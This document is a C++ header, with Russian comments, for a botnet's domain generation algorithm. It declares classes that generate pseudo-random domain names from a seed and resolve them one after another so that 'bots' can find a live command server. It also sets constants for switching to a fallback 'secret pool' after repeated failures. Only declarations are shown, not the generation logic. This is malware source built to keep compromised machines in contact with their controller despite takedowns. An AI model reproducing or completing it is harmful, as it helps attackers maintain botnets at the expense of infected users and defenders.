#pragma once
#include "global.hpp"
#include <ip2string.h>

// максимальное количество доменов для опроса,  не должно быть слишком большим, так как боты будут итеративно проходить по каждому домену опрашивая его
#define MAX_DOMAIN_AMOUNT 128

// максимальное имя домена и минимальное, генерирует имена доменов между [MIN_DOMAINNAME_LENGTH;MAX_DOMAINNAME_LENGTH)
#define MAX_DOMAINNAME_LENGTH 10
#define MIN_DOMAINNAME_LENGTH 5

// количество попыток резолва домена до переключения на секретный пул
#define MAXTRIES_SWITCH_TRIGGER 512

// дга таймаут в мс перед полными проходами доменов (если ни один домен не срезолвился)
#define DGA_TIMEOUT 60 * 1000

// DGA, ответственно за поиск и резолв доменов
class IDomainGenerator
{
public:
	virtual ~IDomainGenerator() = default;
	// итерирует iIndex в [0;MAX_DOMAIN_AMOUNT) в попытках найти работающий домен
	// после этого сохраняет инфу в A-запись и возвращается, если домен не подходит, то можем продолжить поиск через вызов continue_domain_search
	virtual BOOL find_active_domain() = 0;
	// инкрементирует iIndex на 1 и вызывает find_active_domain, продолжая поиск с того момента на котором остановились
	virtual BOOL continue_domain_search() = 0;
	// возвращает индекс текущего домена
	virtual UINT get_index() = 0;
	// устанавливает индекс текущего домена
	virtual UINT set_index(UINT newIndex) = 0;
	// освобождает pRecord
	virtual VOID free_domain() = 0;
	virtual PDNS_RECORD get_record() = 0;
protected:
	// индекс текущего домена для генерации
	UINT iIndex; 
	// содержит информацию о найденном домене
	PDNS_RECORD pRecord;
};

// стандартный DGA: берет за инициализатор rand константу DGA_SEED ^ iIndex, после чего генерирует случайный домен
class DefaultDomainGenerator : protected IDomainGenerator
{
public:
	DefaultDomainGenerator();
	~DefaultDomainGenerator();
	BOOL find_active_domain();
	BOOL continue_domain_search();
	UINT get_index();
	UINT set_index(UINT newIndex);
	VOID free_domain();
	PDNS_RECORD get_record();
private:
	VOID gen_domainname(long *holdrand, PWCHAR pwOut, UINT uLength);
	long get_domain_seed(UINT iIndex);
	long secret_domain_seed(UINT iIndex);
	// общее количество попыток в данном пуле
	UINT iPoolTries;
	// указывает генерировать из секретного пула или нет
	BOOL bSecretPool;
};